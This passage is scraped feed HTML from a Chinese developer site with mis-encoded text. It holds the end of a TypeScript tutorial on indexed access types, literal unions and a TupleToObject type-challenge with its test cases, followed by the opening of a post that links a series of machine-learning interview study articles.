<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå¤šç±»å‹çš„å…ƒç»„ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Tuple</span> = [<span class="hljs-number">123</span>, <span class="hljs-string">"TS"</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">null</span>];

<span class="hljs-comment">// T[number] æå–æ‰€æœ‰å…ƒç´ çš„è”åˆç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleUnion</span> = <span class="hljs-title class_">Tuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼š123 | "TS" | true | null</span>

<span class="hljs-comment">// å˜é‡æ³¨è§£ï¼šå¯ä»¥æ˜¯è”åˆç±»å‹ä¸­çš„ä»»æ„ä¸€ç§</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">val</span>: <span class="hljs-title class_">TupleUnion</span>;
val = <span class="hljs-number">123</span>;    <span class="hljs-comment">// åˆæ³•</span>
val = <span class="hljs-string">"TS"</span>;   <span class="hljs-comment">// åˆæ³•</span>
val = <span class="hljs-literal">true</span>;   <span class="hljs-comment">// åˆæ³•</span>
val = <span class="hljs-literal">null</span>;   <span class="hljs-comment">// åˆæ³•</span>
val = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šä¸åœ¨è”åˆç±»å‹ä¸­</span>
</code></pre>
<ol start="3">
<li>å­—é¢é‡å…ƒç»„</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å­—é¢é‡å…ƒç»„ï¼šå…ƒç´ æ˜¯æ•°å­—/å­—ç¬¦ä¸²å­—é¢é‡</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StatusTuple</span> = [<span class="hljs-number">200</span>, <span class="hljs-number">404</span>, <span class="hljs-number">500</span>];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">EnvTuple</span> = [<span class="hljs-string">"dev"</span>, <span class="hljs-string">"test"</span>, <span class="hljs-string">"prod"</span>];

<span class="hljs-comment">// è½¬å­—é¢é‡è”åˆç±»å‹ï¼ˆå¼€å‘ä¸­å¸¸ç”¨çš„æšä¸¾å¼ç±»å‹ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Status</span> = <span class="hljs-title class_">StatusTuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼š200 | 404 | 500</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Env</span> = <span class="hljs-title class_">EnvTuple</span>[<span class="hljs-built_in">number</span>];       <span class="hljs-comment">// ç»“æœï¼š"dev" | "test" | "prod"</span>

<span class="hljs-comment">// ä¸¥æ ¼é™åˆ¶å˜é‡å€¼ï¼Œé¿å…æ‰‹å†™é”™è¯¯</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">code</span>: <span class="hljs-title class_">Status</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// åˆæ³•</span>
code = <span class="hljs-number">404</span>;             <span class="hljs-comment">// åˆæ³•</span>
code = <span class="hljs-number">403</span>;             <span class="hljs-comment">// âŒ æŠ¥é”™ï¼š403 ä¸åœ¨ 200|404|500 ä¸­</span>

<span class="hljs-keyword">let</span> <span class="hljs-attr">env</span>: <span class="hljs-title class_">Env</span> = <span class="hljs-string">"dev"</span>;   <span class="hljs-comment">// åˆæ³•</span>
env = <span class="hljs-string">"prod"</span>;           <span class="hljs-comment">// åˆæ³•</span>
env = <span class="hljs-string">"production"</span>;     <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šä¸åœ¨è”åˆç±»å‹ä¸­</span>
</code></pre>
<ol start="4">
<li><code>as const</code> + æ•°ç»„ + <code>T[number]</code></li>
</ol>
<p>åŒæ—¶æ‹¥æœ‰æ•°ç»„çš„å¯éå†æ€§ + è”åˆç±»å‹çš„ä¸¥æ ¼ç±»å‹çº¦æŸã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æ­¥éª¤1ï¼šç”¨ as const æ–­è¨€æ•°ç»„ä¸ºã€Œåªè¯»å­—é¢é‡å…ƒç»„ã€</span>
<span class="hljs-comment">// ä½œç”¨ï¼šè®© TS ä¿ç•™æ¯ä¸ªå…ƒç´ çš„å­—é¢é‡ç±»å‹ï¼Œä¸”æŠŠæ•°ç»„è½¬ä¸ºåªè¯»å…ƒç»„ï¼ˆä¸å¯ä¿®æ”¹ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">EnvArr</span> = [<span class="hljs-string">"dev"</span>, <span class="hljs-string">"test"</span>, <span class="hljs-string">"prod"</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;
<span class="hljs-keyword">const</span> <span class="hljs-title class_">StatusArr</span> = [<span class="hljs-number">200</span>, <span class="hljs-number">404</span>, <span class="hljs-number">500</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;

<span class="hljs-comment">// æ­¥éª¤2ï¼šç”¨ typeof è·å–æ•°ç»„çš„ç±»å‹ï¼ˆåªè¯»å­—é¢é‡å…ƒç»„ç±»å‹ï¼‰</span>
<span class="hljs-comment">// è¡¥å……ï¼štypeof æ˜¯ TS å…³é”®å­—ï¼Œç”¨äºã€Œä»å˜é‡ä¸­æå–å…¶ç±»å‹ã€</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">EnvTuple</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">EnvArr</span>; <span class="hljs-comment">// ç±»å‹ï¼šreadonly ["dev", "test", "prod"]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StatusTuple</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">StatusArr</span>; <span class="hljs-comment">// ç±»å‹ï¼šreadonly [200, 404, 500]</span>

<span class="hljs-comment">// æ­¥éª¤3ï¼šç”¨ T[number] è½¬æˆå­—é¢é‡è”åˆç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Env</span> = <span class="hljs-title class_">EnvTuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼š"dev" | "test" | "prod"</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Status</span> = <span class="hljs-title class_">StatusTuple</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼š200 | 404 | 500</span>

<span class="hljs-comment">// ç®€åŒ–å†™æ³•ï¼ˆå¼€å‘ä¸­å¸¸ç”¨ï¼Œçœç•¥ä¸­é—´å…ƒç»„ç±»å‹ï¼‰</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">EnvSimplify</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">EnvArr</span>[<span class="hljs-built_in">number</span>];
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StatusSimplify</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">StatusArr</span>[<span class="hljs-built_in">number</span>];
</code></pre>
<ol start="5">
<li>æ³›å‹ä¸­ä½¿ç”¨ <code>T[number]</code></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æ³›å‹ T çº¦æŸä¸ºã€Œåªè¯»æ•°ç»„ã€ï¼ˆå…¼å®¹ as const æ–­è¨€çš„æ•°ç»„ï¼‰</span>
<span class="hljs-keyword">function</span> getUnionType&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">any</span>[]&gt;(<span class="hljs-attr">arr</span>: T): T[<span class="hljs-built_in">number</span>] {
  <span class="hljs-keyword">return</span> arr[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * arr.<span class="hljs-property">length</span>)];
}

<span class="hljs-comment">// ä¼ å…¥ as const æ–­è¨€çš„æ•°ç»„ï¼Œè¿”å›å€¼è‡ªåŠ¨æ¨å¯¼ä¸ºå­—é¢é‡è”åˆç±»å‹</span>
<span class="hljs-keyword">const</span> res1 = <span class="hljs-title function_">getUnionType</span>([<span class="hljs-string">"dev"</span>, <span class="hljs-string">"test"</span>, <span class="hljs-string">"prod"</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>); <span class="hljs-comment">// res1 ç±»å‹ï¼š"dev" | "test" | "prod"</span>
<span class="hljs-keyword">const</span> res2 = <span class="hljs-title function_">getUnionType</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>); <span class="hljs-comment">// res2 ç±»å‹ï¼š1 | 2 | 3</span>

<span class="hljs-comment">// ä¼ å…¥æ™®é€šæ•°ç»„ï¼Œè¿”å›å€¼æ¨å¯¼ä¸ºåŸºç¡€ç±»å‹</span>
<span class="hljs-keyword">const</span> res3 = <span class="hljs-title function_">getUnionType</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// res3 ç±»å‹ï¼šnumber</span>
</code></pre>
<ol start="6">
<li>æ”¯æŒåµŒå¥—æ•°ç»„ / å…ƒç»„</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title class_">NestedArr</span> = [[<span class="hljs-number">1</span>, <span class="hljs-string">"a"</span>], [<span class="hljs-number">2</span>, <span class="hljs-string">"b"</span>]] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NestedUnion</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">NestedArr</span>[<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼šreadonly [1, "a"] | readonly [2, "b"]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">DeepUnion</span> = <span class="hljs-keyword">typeof</span> <span class="hljs-title class_">NestedArr</span>[<span class="hljs-built_in">number</span>][<span class="hljs-built_in">number</span>]; <span class="hljs-comment">// ç»“æœï¼š1 | "a" | 2 | "b"</span>
</code></pre>
<h3 data-id="heading-10">æµ‹è¯•ç”¨ä¾‹</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ æµ‹è¯•ç”¨ä¾‹ _____________ */</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">Equal</span>, <span class="hljs-title class_">Expect</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@type-challenges/utils'</span>

<span class="hljs-keyword">const</span> tuple = [<span class="hljs-string">'tesla'</span>, <span class="hljs-string">'model 3'</span>, <span class="hljs-string">'model X'</span>, <span class="hljs-string">'model Y'</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
<span class="hljs-keyword">const</span> tupleNumber = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
<span class="hljs-keyword">const</span> sym1 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-number">1</span>)
<span class="hljs-keyword">const</span> sym2 = <span class="hljs-title class_">Symbol</span>(<span class="hljs-number">2</span>)
<span class="hljs-keyword">const</span> tupleSymbol = [sym1, sym2] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
<span class="hljs-keyword">const</span> tupleMix = [<span class="hljs-number">1</span>, <span class="hljs-string">'2'</span>, <span class="hljs-number">3</span>, <span class="hljs-string">'4'</span>, sym1] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>

<span class="hljs-keyword">type</span> cases = [
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tuple&gt;, { <span class="hljs-string">'tesla'</span>: <span class="hljs-string">'tesla'</span>, <span class="hljs-string">'model 3'</span>: <span class="hljs-string">'model 3'</span>, <span class="hljs-string">'model X'</span>: <span class="hljs-string">'model X'</span>, <span class="hljs-string">'model Y'</span>: <span class="hljs-string">'model Y'</span> }&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tupleNumber&gt;, { <span class="hljs-number">1</span>: <span class="hljs-number">1</span>, <span class="hljs-number">2</span>: <span class="hljs-number">2</span>, <span class="hljs-number">3</span>: <span class="hljs-number">3</span>, <span class="hljs-number">4</span>: <span class="hljs-number">4</span> }&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tupleSymbol&gt;, { [sym1]: <span class="hljs-keyword">typeof</span> sym1, [sym2]: <span class="hljs-keyword">typeof</span> sym2 }&gt;&gt;,
  <span class="hljs-title class_">Expect</span>&lt;<span class="hljs-title class_">Equal</span>&lt;<span class="hljs-title class_">TupleToObject</span>&lt;<span class="hljs-keyword">typeof</span> tupleMix&gt;, { <span class="hljs-number">1</span>: <span class="hljs-number">1</span>, <span class="hljs-string">'2'</span>: <span class="hljs-string">'2'</span>, <span class="hljs-number">3</span>: <span class="hljs-number">3</span>, <span class="hljs-string">'4'</span>: <span class="hljs-string">'4'</span>, [sym1]: <span class="hljs-keyword">typeof</span> sym1 }&gt;&gt;,
]

<span class="hljs-comment">// @ts-expect-error</span>
<span class="hljs-keyword">type</span> error = <span class="hljs-title class_">TupleToObject</span>&lt;[[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], {}]&gt;

</code></pre>
<h3 data-id="heading-11">ç›¸å…³é“¾æ¥</h3>
<blockquote>
<p>åˆ†äº«ä½ çš„è§£ç­”ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F11%2Fanswer%2Fzh-CN" target="_blank" title="https://tsch.js.org/11/answer/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/11/answer/zâ€¦</a>
æŸ¥çœ‹è§£ç­”ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F11%2Fsolutions" target="_blank" title="https://tsch.js.org/11/solutions" ref="nofollow noopener noreferrer">tsch.js.org/11/solutionâ€¦</a>
æ›´å¤šé¢˜ç›®ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2Fzh-CN" target="_blank" title="https://tsch.js.org/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/zh-CN</a></p>
</blockquote>
<p>ä¸‹é¢æ˜¯æˆ‘çš„å…¬ä¼—å·ï¼Œæ¬¢è¿å…³æ³¨ã€‚å…³æ³¨åæœ‰æ–°çš„åŠŸèƒ½ç‚¹ä¼šåŠæ—¶æ”¶åˆ°æ¨é€ã€‚</p>
<blockquote>
<p>å®æˆ˜ä¸ºç‹ï¼ä¸“æ³¨äºæ±‡æ€»å„ç§åŠŸèƒ½ç‚¹ï¼Œè‡´åŠ›äºæ‰“é€ ä¸€ç³»åˆ—èƒ½å¤Ÿå¸®åŠ©å·¥ç¨‹å¸ˆå®ç°å„ç§åŠŸèƒ½çš„æƒ³æ³•æ€è·¯çš„ä¼˜è´¨æ–‡ç« ã€‚</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4bdeec99a0154e7aa73c1c6765f3dcf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZnhzcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770391205&amp;x-signature=BePhgA1vquk1pj8MgVekhcJIeOM%3D" alt="å‰ç«¯åŠŸèƒ½ç‚¹" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æœºå™¨å­¦ä¹ å…«è‚¡è¶…å…¨å†…å®¹ï¼ï¼ï¼]]></title>    <link>https://juejin.cn/post/7600787795478331438</link>    <guid>https://juejin.cn/post/7600787795478331438</guid>    <pubDate>2026-01-30T15:44:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795478331438" data-draft-id="7600787795478315054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æœºå™¨å­¦ä¹ å…«è‚¡è¶…å…¨å†…å®¹ï¼ï¼ï¼"/> <meta itemprop="keywords" content="é¢è¯•,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-30T15:44:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aicoting"/> <meta itemprop="url" content="https://juejin.cn/user/933911964427818"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æœºå™¨å­¦ä¹ å…«è‚¡è¶…å…¨å†…å®¹ï¼ï¼ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933911964427818/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aicoting
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:44:56.000Z" title="Fri Jan 30 2026 15:44:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æ¨èç›´æ¥ç½‘ç«™åœ¨çº¿é˜…è¯»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Faicoting.cn%2F" target="_blank" title="https://aicoting.cn/" ref="nofollow noopener noreferrer">aicoting |AIç®—æ³•é¢è¯•å­¦ä¹ </a></p>
</blockquote>
<p>å‰é¢æˆ‘ä»¬ä»‹ç»äº†æœºå™¨å­¦ä¹ ä¸­çš„æ‰€æœ‰çŸ¥è¯†ç‚¹ï¼Œä»æœ€å¼€å§‹ç¡®å®šæœºå™¨å­¦ä¹ çŸ¥è¯†åº“çŸ¥è¯†ä½“ç³»æ¡†æ¶ï¼Œåˆ°ç¼–å†™å†…å®¹ï¼Œå†åˆ°æœ€åçš„æ’ç‰ˆï¼Œå‰å‰ååä¸‰ä¸ªæœˆçš„æ—¶é—´ï¼Œç»ˆäºæœºå™¨å­¦ä¹ çŸ¥è¯†åº“å’Œå¤§å®¶è§é¢ï¼ŒçŸ¥è¯†åº“ä¸­ä»æœºå™¨å­¦ä¹ çš„å®šä¹‰ï¼Œåˆ°æ•°å­¦ä¸ç†è®ºåŸºç¡€ï¼Œå†åˆ°æ•°æ®ä¸ç‰¹å¾å·¥ç¨‹ï¼Œå†åˆ°ç›‘ç£å­¦ä¹ æ–¹æ³•ã€æ— ç›‘ç£å­¦ä¹ æ–¹æ³•ã€åŠç›‘ç£å­¦ä¹ æ–¹æ³•ã€å¼ºåŒ–å­¦ä¹ ï¼Œæœ€åå†åˆ°æ¨¡å‹è¯„ä¼°ï¼Œæˆ‘å°½é‡æ¶µç›–äº†æœºå™¨å­¦ä¹ æ‰€æœ‰çš„ç»å…¸å†…å®¹ã€‚</p>
<p>å¹¶ä¸”ä¸ºäº†å¸®åŠ©å¤§å®¶æ›´å¥½çš„ç†è§£ï¼Œå…¶ä¸­ç»å¤§éƒ¨åˆ†çŸ¥è¯†ç‚¹éƒ½ç¼–å†™äº†ç¤ºä¾‹ä»£ç ï¼Œå¤§å®¶å¯ä»¥ç»“åˆè¿›è¡Œå­¦ä¹ ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/129446fbff6f4f42aa7215373840ef43~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770392695&amp;x-signature=wHx7wWI1fZE%2FCghUr%2FyJ96FMRxY%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec80d5629b24dcbb75ea318469259e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770392695&amp;x-signature=9DjiPh%2BTgBj5uSRGypHG%2B0zNffc%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p>å¦‚æœä½ çœ‹åˆ°äº†è¿™é‡Œï¼Œä½ å¯ä»¥åœ¨è„‘è¢‹é‡Œå›å¿†ä¸€ä¸‹æœºå™¨å­¦ä¹ çš„çŸ¥è¯†æ¡†æ¶ï¼Œæ¯ä¸ªæ¡ç›®é‡Œéƒ½æœ‰ä»€ä¹ˆçŸ¥è¯†ç‚¹ä½ è¿˜è®°å¾—å—ï¼Ÿè¿™ä¸ªçŸ¥è¯†ç‚¹ä½ å¤§æ¦‚å…¨éƒ½ç†è§£äº†å—ï¼Ÿæ˜¯ä¸æ˜¯å·²ç»æŒæ¡äº†ï¼Ÿé¢è¯•å®˜å¦‚æœé—®æˆ‘æˆ‘èƒ½æ¸…æ™°çš„å›ç­”å‡ºæ¥å—ï¼Ÿ</p>
<p>å¦‚æœä¸Šé¢çš„ç­”æ¡ˆå…¨éƒ½æ˜¯yesï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ å·²ç»ä¸ºæ·±åº¦å­¦ä¹ å’ŒAIå¤§æ¨¡å‹æ‰“ä¸‹äº†åšå®çš„åŸºç¡€ï¼Œæ›´æ·±å±‚æ¬¡çš„å­¦ä¹ ä¸ä¼šæ¯”ä»0åˆ°1æ›´å›°éš¾äº†ï¼</p>
<p>è¿™ä¸ªçŸ¥è¯†åº“åˆ°è¿™é‡Œå¹¶æ²¡æœ‰ç»“æŸï¼Œæˆ‘åç»­ä¼šè¿›è¡ŒæŒç»­æ›´æ–°ï¼Œå¦‚æœå¤§å®¶è§‰å¾—æœ‰ä»€ä¹ˆç»å…¸çš„çŸ¥è¯†ç‚¹æˆ–è€…é¢è¯•å¸¸é—®çš„çŸ¥è¯†ç‚¹æˆ‘æ²¡æœ‰è®²åˆ°ï¼Œæ¬¢è¿åœ¨ä¸‹æ–¹ç•™è¨€ï¼ï¼ï¼</p>
<p>æˆ‘æŠŠæœºå™¨å­¦ä¹ çš„æ‰€æœ‰æ–‡ç« å‡åˆ—åœ¨äº†ä¸‹æ–¹ï¼Œä¾›å¤§å®¶éšæ—¶é˜…è¯»ã€‚</p>
<h2 data-id="heading-0">æœºå™¨å­¦ä¹ æ¦‚è¿°å’Œæ•°å­¦åŸºç¡€</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1984777337598936630" target="_blank" title="https://zhuanlan.zhihu.com/p/1984777337598936630" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ å…¥é—¨çŸ¥è¯†ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1985464409682884606" target="_blank" title="https://zhuanlan.zhihu.com/p/1985464409682884606" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ çº¿æ€§ä»£æ•°åŸºç¡€çŸ¥è¯†ï¼</a></p>
